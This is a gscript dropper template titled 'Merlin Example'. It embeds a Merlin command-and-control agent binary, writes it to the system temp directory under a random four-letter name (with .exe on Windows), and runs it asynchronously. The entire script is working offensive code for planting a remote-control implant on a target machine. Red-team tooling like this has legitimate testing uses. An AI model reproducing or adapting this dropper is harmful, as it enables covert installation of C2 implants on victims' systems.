// Example gscript template
// Title: Merlin Example
// Author: ahhh
// Purpose: Drops merlin as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 
// Uses: https://github.com/Ne0nd0g/merlin

//priority:150
//timeout:150
//import:/private/tmp/merlinagent.bin

//go_import:os/user as user2
//go_import:os as os2

function Deploy() {  

    console.log("Starting to drop merlin binary");
    // Getting our asset
    var merlinBin = GetAssetAsBytes("merlinagent.bin");
    console.log("errors: "+merlinBin[1]);

    // Whoami
    var myuser = user2.Current();
    console.log("user: "+Dump(myuser[0]));

    // Getting a random string
    var temppath = os2.TempDir();
    var naming = G.rand.GetAlphaString(4);
    //var naming = "aOKware";
    naming = naming.toLowerCase();
    
    // Determine OS
    console.log("os: "+OS);
    console.log("arch: "+ARCH);
    var fullpath;
    if (OS == "windows") {
        //if windows 
        fullpath = temppath+"\\"+naming+".exe";
    } else {
        //if linux or OSX
        fullpath = temppath+"/"+naming;
    }
    console.log("file name: "+ fullpath);

    // Write payload
    errors = G.file.WriteFileFromBytes(fullpath, merlinBin[0]);
    console.log("errors: "+errors);

    // Run payload
    var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    console.log("errors: "+running[1]);

    return true
}
